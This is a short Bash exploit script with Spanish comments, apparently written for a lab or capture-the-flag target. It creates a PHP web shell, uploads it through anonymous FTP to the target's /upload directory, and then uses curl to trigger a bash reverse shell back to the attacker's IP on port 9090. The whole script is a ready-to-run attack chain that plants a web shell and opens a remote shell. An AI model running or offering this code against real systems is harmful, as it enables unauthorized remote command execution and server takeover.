#!/bin/bash


# colores
ROJO='\033[1;31m'
RESET='\033[0m'


# variables
IP="$1"
IPA="$2"


# Verificacion de root
if [ "$(whoami)" != "root" ]; then
    echo -e "${ROJO}Este script debe ser ejecutado como root.${RESET}"
    exit 1
fi


# verificacion de binarios
check() {
     if command -v "$1" >/dev/null 2>&1; then
         echo -e "${ROJO} El binario '$1' está instalado${RESET}"
     else
         echo -e "${ROJO} El binario '$1' no está instalado, instalelo e intente nuevamente${RESET}"
         exit 1
     fi
}

check nc
check tnftp
check curl


# verificacion de uso
if [ -z "$IP" ] || [ -z "$IPA" ]; then
    echo -e "${ROJO}Uso: $0 <ip> <ip atacante>${RESET}"
    exit 1
fi


# payload
echo '<?php' > cmd.php
echo '       system($_GET["cmd"]);' >> cmd.php
echo '?>' >> cmd.php


# advertencia
echo -e "${ROJO}Escuche en el puerto 9090 con netcat para que funcione correctamente${RESET}"

sleep 4

# comandos ftp y subida del payload
{
 echo "open $IP"
 echo "user anonymous"
 echo " "
 echo "put ./cmd.php /upload/cmd.php"
 echo "bye"
} > ftp_comandos.txt

ftp -n < ftp_comandos.txt


# eliminacion del archivo temporal
rm ftp_comandos.txt


# mensaje
echo -e "${ROJO}Enviando reverse shell....${RESET}"

sleep 4


# solicitud en la web que envía una reverse shell
curl "http://$IP/upload/cmd.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/$IPA/9090%200>%261'" &
